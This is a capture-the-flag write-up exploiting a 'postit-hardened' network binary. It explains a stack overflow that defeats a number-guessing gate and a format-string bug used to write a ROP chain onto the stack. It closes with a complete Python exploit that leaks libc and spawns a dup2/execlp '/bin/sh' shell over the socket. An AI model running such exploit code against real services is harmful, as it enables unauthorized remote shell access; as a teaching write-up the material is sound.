
The binary can be downloaded from http://treasure.pwnies.dk/2f75f56cd7773114dd8b5aa5f64fb347/postit-hardened

## Part 1 - The number guess game

Upon connecting to the server, we are greeted by this:
```
$ nc localhost 9999
STOP! To get past me you must guess the number I am thinking of.

You may guess three times.
?
```
We must win this game somehow to move forward.  A quick look at the code reveals a function at 0x08048A7E which I call `num_guess_game()`.  `num_guess_game()` in turn takes input from the user and compares it a 32-bit integer generated with `rand()`.  Since the user only has three tries to guess correctly, guessing the number is out of the question.  Let's look at the meat of `num_guess_game()`:
```
.text:08048AB7 loc_8048AB7:                            ; CODE XREF: num_guess_game+5Bj
.text:08048AB7                 inc     eax
.text:08048AB8                 mov     [ebp+var_28], eax
.text:08048ABB
.text:08048ABB loc_8048ABB:                            ; CODE XREF: num_guess_game+37j
.text:08048ABB                 push    eax
.text:08048ABC                 lea     eax, [ebp+var_28]
.text:08048ABF                 add     eax, [ebp+var_28]
.text:08048AC2                 push    1               ; nbytes
.text:08048AC4                 add     eax, 8
.text:08048AC7                 push    eax             ; buf
.text:08048AC8                 push    ebx             ; status
.text:08048AC9                 call    read_nbytes
.text:08048ACE                 mov     eax, [ebp+var_28]
.text:08048AD1                 add     esp, 10h
.text:08048AD4                 cmp     [ebp+eax+nptr], 0Ah
.text:08048AD9                 jnz     short loc_8048AB7
.text:08048ADB                 sub     esp, 0Ch
.text:08048ADE                 push    esi             ; nptr
.text:08048ADF                 mov     [ebp+eax+nptr], 0
.text:08048AE4                 call    _atoi
.text:08048AE9                 add     esp, 10h
.text:08048AEC                 cmp     eax, [ebp+rand_num]
.text:08048AEF                 mov     [ebp+var_C], eax
.text:08048AF2                 jnz     short loc_8048B0C
.text:08048AF4                 push    esi
.text:08048AF5                 push    11h             ; n
.text:08048AF7                 push    offset aThatIsCorrect_ ; "That is correct.\n"
.text:08048AFC                 push    ebx             ; fd
.text:08048AFD                 call    _write
```
`num_guess_game()` runs a loop that increments a pointer and calls an input function I have named `read_nbytes()` to read one byte at a time from the socket to the pointer's address.  More on `read_nbytes()` shortly.  The important part to notice here is the terminating condition of the input loop. `num_guess_game()` will stop reading input when a newline character is read.  There is no bounds checking done on the input buffer; `num_guess_game()` will happily write past the end.  It will then replace the newline with a NULL and call `atoi()` on the input string.  The resulting integer value is compared to the saved random number `rand_num`, and if they're equal, we move on.   So how can we leverage this buffer overflow?  Let's take a look at what will be overwritten on the stack:
```
.text:08048A7E var_28          = dword ptr -28h
.text:08048A7E var_24          = dword ptr -24h
.text:08048A7E nptr            = byte ptr -20h
.text:08048A7E rand_num        = dword ptr -10h
.text:08048A7E var_C           = dword ptr -0Ch
.text:08048A7E status          = dword ptr  8
```
The stack layout works in our favor.  We can write past the buffer `nptr` and replace `rand_num` with a value of our choosing.  Since we know the value of `rand_num`, we just need to ensure it matches return value of `atoi()`.  Unfortunately the `read_nbytes()` function is going to complicate things.

`read_nbytes()` is a wrapper function to `read()` with the following prototype:
```int read_nbytes(int fd, void *buf, int nbytes);```
The function will read `nbytes` from `fd` in to the address pointed to by `buf`.  If data is successfully read from the socket, `read_nbytes()` applies the following logic to each character read:
```
if (c != '\n' && c != '\r') {
    if ((c - 32) > 0x5e) {
        write(fd, "WAT?\n", 5);
        close(fd);
        exit(0);
    }
}
```
This effectively limits our inputs to the character range 0x20-0x7f, with the exception of '\n' and '\r'.  We know that providing '\n' will terminate the loop in `num_guess_game()`, so that's not useful.  Since '\r' also gets special treatment, we can replace the contents of `rand_num` with 0x0d0d0d0d and prepend the ASCII encoding of the integer value for that number:
```
'218959117'+ '\x0d'*11 + '\n'
```
This string will always win the number game and allows us to move on to part 2.

## Part 2 - Format string vulnerability

Now that we've figured out the number guessing game, we move on.  We are greeted with the following prompt:
```
What do you want?
 1. Write
 2. Read
```
The service is essentially a postit note service.  You can write notes and read them back out later.  For the sake of brevity, I'm going to summarize a large amount of information that pertains to part 2:

1. Notes are saved locally within `/tmp` when they are written.  Once read, notes are removed from the filesystem.

2. The program does some manual randomization of the stack location via `sub_8048D48()` before reading/writing notes.  `sub_8048D48()` is a curious function.  It takes a value generated by `rand()`, performs a logical AND operation with `0xfffd0000`, and attempts to `mmap()` that area of memory.  If successful, it will additionally perform a logical OR on the address with `0x24242` and relocate the stack to that address.  While this does effectively randomize the 2 most significant bytes of the stack bottom, the 2 least significant bits always start a `0xXXXX4242`.  More on this shortly.

3. There is a global buffer at `0x0804A584` that is used for both reading and writing notes in blocks of 4096 bytes.

4. When a note is read, the file contents are read into the buffer at `0x0804A584` (4096 bytes at a time) and fed directly to the `dprintf()` function.  This is the format string vulnerability.  Note however that our format string does NOT lie in the stack.

5. All user input is handled through that bastard of a function `read_nbytes()`, which, as a reminder, limits us to input in the range of `0x20-0x7f`.

6. NX is enabled, and the new stack location is not executable either (wherever that may be).

Right away, you might be wondering how to leverage the format string vulnerability when we can't reference the format string itself for target addresses for short writes.  Looking at the stack for candidate pointers at the time of the `dprintf()` call didn't turn up much of anything.  I did however notice a large 200 byte buffer on the stack that is used for the client's menu selection during the write note/read note menu logic.  Can we sneak some pointers into that buffer and reference them from the format string?  No!  Not unless the bytes of the addresses you'd like to write to all lie within `0x20-0x7f`.  And they don't.  After much experimentation, I came to the conclusion that the only way to leverage the format string vulnerability is to use it to write a ROP chain to the 200 byte buffer.  But how to we know where the buffer lies in memory?  Isn't the stack location now effectivly randomzied?

Yes and no.  Due to the fact that the stack always starts at an address ending in `0x4242`, we know the location of the buffer in memory will always have the same two least significant bytes (test this out if you don't believe it).  Since there are plenty of pointers lying around the stack in predictable places, we can simply overwrite the two least sig. bytes of one of them to point to any location in the stack, and reference that pointer from the format string to write to that two byte memory location.  Now we have the power to write to a location of our choosing within the stack.  Using this, we can write a ROP chain into the 200 byte stack buffer.  But how do we kick it off?  Fortunately, there are plently of pointers to our 200 byte buffer already laying in the stack.  We can overwrite the last 2 bytes of the saved ebp value for the stack frame of the function that calls `dprintf()` in such a way that the next stack frame will `ret` to a pointer to our ROP chain.

At this point we have two options: we can either write a full ROP chain into memory to do our bidding, or we put an executable payload into the global buf at `0x0804A584` and use the ROP chain opportunity to call `mprotect()` to make the payload executable and `ret` to it.  I chose the full ROP payload route, as it seemed to be the easiest.  In order for this to work, we need to know the location of libc in memory.  We can leverage the format string vulnerability to leak libc addresses on the stack and calculate it from there (see exploit below for details).  In this case I had the target machine's libc from a previous exploit; you will need to do the same through whatever means necessary (you COULD suck it out using the format string vulnerability...).  The ROP chain built for this exploit leverages the fact that the client socket will always be `4`.  It is a standard `dup2()x3 / exec('/bin/sh')`.

## Final Notes and Caveats

Due to some strange behavior with `dprintf()`, I could not chain together pointer creations/pointer writes within one call of `dprintf()`; I had to force the program to loop back to successive calls of `dprintf()` by padding each part of the format string out to 4096 bytes.  If this makes no sense, try it out yourself.  You won't be able to create a pointer in memory AND utilize that pointer during the same call to `dprintf()`.  I gave up on figuring out why.

The provided exploit relies on the socket library written by hellman of MSLC.  Library can be found at https://github.com/hellman/sock and thanks to hellman for the hard work.

```python
#!/usr/bin/python
import telnetlib
import time
from sock import Sock

# connection settings
host = '127.0.0.1'
port = '9999'

def create_connection():
    sock = Sock(host+':'+port, timeout=500)
    print '[+] Connected to ' + host+':'+port
    return sock

def close_connection(sock):
    sock.close()
    print "[+] Closed socket."

def put_file(sock, fname, text):
    sock.read_until('? ')
    sock.send(win_num_game)
    sock.read_until('? ')
    sock.send('1'+' '*98)
    sock.read_until('name? ')
    sock.send(fname + '\n')
    sock.read_until('socket.\n')
    sock.send(text)

def print_file(sock, fname):
    sock.read_until('? ')
    sock.send(win_num_game)
    sock.read_until('? ')
    sock.send('2'+' '*98)
    sock.read_until('note? ')
    sock.send(fname + '\n')
    return sock.read_until('end')

# input used to win the number guess game
win_num_game = '218959117'+ '\x0d'*11 + '\n'
# filename to use on the server side
file_name = 'testfoo'

# put file to leak libc address
fmt_string_libc = '%18$x end'
s = create_connection()
put_file(s, file_name, fmt_string_libc)
print '[+] Sent format string to find libc address'
close_connection(s)

# CHANGE THESE to offsets that make sense with your libc
libc_offset = 0x34827
dup2_offset = 0xdc0b0
execlp_offset = 0xb6ba0
binsh_offset = 0x1615a4

s = create_connection()
out = print_file(s, file_name)
libc_address = int(out[:8], 16) - libc_offset 
print '[+] Got libc address: ' + str(hex(libc_address))
dup2_addr = libc_address + dup2_offset
execlp_addr = libc_address + execlp_offset
binsh_addr = libc_address + binsh_offset
print '[+] dup2() address: ' + str(hex(dup2_addr))
print '[+] execlp() address: ' + str(hex(execlp_addr))
print '[+] \'/bin/sh\' address: ' + str(hex(binsh_addr))
close_connection(s)

# now that have we addr of dup2 and execlp, we generate the format string.
# the rop_tuples data structure is a list of 2-tuples consisting of
# the low two bytes of the destination memory address and its desired contents
pop2ret = 0x8048a7b
rop_tuples = [
    (0x41a2, (dup2_addr & 0xffff)),         # addr of dup2()
    (0x41a4, (dup2_addr >> 16)),
    (0x41a6, (pop2ret & 0xffff)),           # pop esi; pop ebp; ret 
    (0x41a8, (pop2ret >> 16)), 
    (0x41aa, 0x0004),                       # client sock 
    (0x41ac, 0x0000),  
    (0x41ae, 0x0000),                       # fd 
    (0x41b0, 0x0000),
    (0x41b2, (dup2_addr & 0xffff)),         # addr of dup2()
    (0x41b4, (dup2_addr >> 16)),
    (0x41b6, (pop2ret & 0xffff)),           # pop esi; pop ebp; ret 
    (0x41b8, (pop2ret >> 16)),
    (0x41ba, 0x0004),                       # client sock 
    (0x41bc, 0x0000),
    (0x41be, 0x0001),                       # fd 
    (0x41c0, 0x0000),
    (0x41c2, (dup2_addr & 0xffff)),         # addr of dup2()
    (0x41c4, (dup2_addr >> 16)),
    (0x41c6, (pop2ret & 0xffff)),           # pop esi; pop ebp; ret 
    (0x41c8, (pop2ret >> 16)),
    (0x41ca, 0x0004),                       # client sock 
    (0x41cc, 0x0000),
    (0x41ce, 0x0002),                       # fd 
    (0x41d0, 0x0000),
    (0x41d2, (execlp_addr & 0xffff)),       # addr of execlp()
    (0x41d4, (execlp_addr >> 16)),
    # next 4 bytes can be junk
    (0x41da, (binsh_addr & 0xffff)),        # addr of '/bin/sh'
    (0x41dc, (binsh_addr >> 16)),
    (0x41de, (binsh_addr & 0xffff)),        # addr of '/bin/sh'
    (0x41e0, (binsh_addr >> 16)), 
    (0x41e2, 0x0000),                       # NULL
    (0x41e4, 0x0000),
    (0x417a, 0x419e)                        # modify saved ebp to ret to our
                                            # rop chain later
]

# direct access parameter to generate pointer in mem (0xXXXX412a)
ptr_dap = '25'
# direct access parameter to write to mem location specified by pointer
memwrite_dap = '37'
fmt_string_exploit = ''
for tup in rop_tuples:
    # split tuple into target address and contents
    addr, contents = tup
    # first fmt string creates the pointer in memory we need
    t1 = '%{0}c%{1}$hn'.format(addr, ptr_dap)
    # pad it out to 4096 so we cycle back to another call of dprintf()
    if (len(t1) < 4095):
        t1 += 'A'*(4095-len(t1))
    # now that we have a pointer, use it to write 2 bytes into memory
    if (contents != 0):
        t2 = '%{0}c%{1}$hn'.format(contents, memwrite_dap) 
    else:
        t2 = '%{0}$hn'.format(memwrite_dap)
    # pad it out to 4096 so we cycle back to another call of dprintf()
    if (len(t2) < 4095):
        t2 += 'A'*(4095-len(t2))
    fmt_string_exploit += t1 + t2 

# put file to trigger exploit
s = create_connection()
put_file(s, file_name, fmt_string_exploit)
print '[+] Sent exploit format string'
close_connection(s)

# trigger exploit
s = create_connection()
out = print_file(s, file_name)

print 'Might have a shell...'

t = telnetlib.Telnet()
t.sock = s.sock
t.interact()
```
